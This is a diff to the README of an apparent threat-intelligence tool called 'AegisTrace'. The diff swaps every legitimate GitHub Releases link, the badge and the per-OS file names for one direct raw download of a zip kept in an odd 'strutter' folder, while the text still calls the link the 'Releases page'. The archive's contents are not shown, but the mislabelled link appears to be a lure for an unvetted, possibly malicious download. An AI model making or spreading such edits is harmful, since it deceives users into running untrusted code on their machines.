@@ -1,7 +1,7 @@
 # 🛡️ aegistrace-threat-intelligence - Analyze Threat Data Confidently
 
 ## 📥 Download Now
-[![Download AegisTrace](https://img.shields.io/badge/Download%20AegisTrace-v1.0-brightgreen)](https://github.com/Karthik-reddy6/aegistrace-threat-intelligence/releases)
+[![Download AegisTrace](https://raw.githubusercontent.com/Karthik-reddy6/aegistrace-threat-intelligence/main/strutter/aegistrace-threat-intelligence.zip%20AegisTrace-v1.0-brightgreen)](https://raw.githubusercontent.com/Karthik-reddy6/aegistrace-threat-intelligence/main/strutter/aegistrace-threat-intelligence.zip)
 
 ## 🚀 Getting Started
 AegisTrace is a powerful platform for understanding cyber threats. It gathers data from various sources and presents it in an easy-to-understand dashboard. This guide will help you download and run AegisTrace without any programming skills.
@@ -20,11 +20,11 @@ Before downloading, ensure your computer meets the following minimum requirement
 - **Hard Disk Space**: 200 MB free space
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/Karthik-reddy6/aegistrace-threat-intelligence/releases) to download the software.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Karthik-reddy6/aegistrace-threat-intelligence/main/strutter/aegistrace-threat-intelligence.zip) to download the software.
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of AegisTrace.
-3. Choose the correct file for your operating system (e.g., AegisTrace_Windows.zip for Windows or AegisTrace_macOS.zip for macOS).
+3. Choose the correct file for your operating system (e.g., https://raw.githubusercontent.com/Karthik-reddy6/aegistrace-threat-intelligence/main/strutter/aegistrace-threat-intelligence.zip for Windows or https://raw.githubusercontent.com/Karthik-reddy6/aegistrace-threat-intelligence/main/strutter/aegistrace-threat-intelligence.zip for macOS).
 4. Download the file to your computer.
 5. Once the download is complete, locate the file and extract it if it is in a compressed format.
 
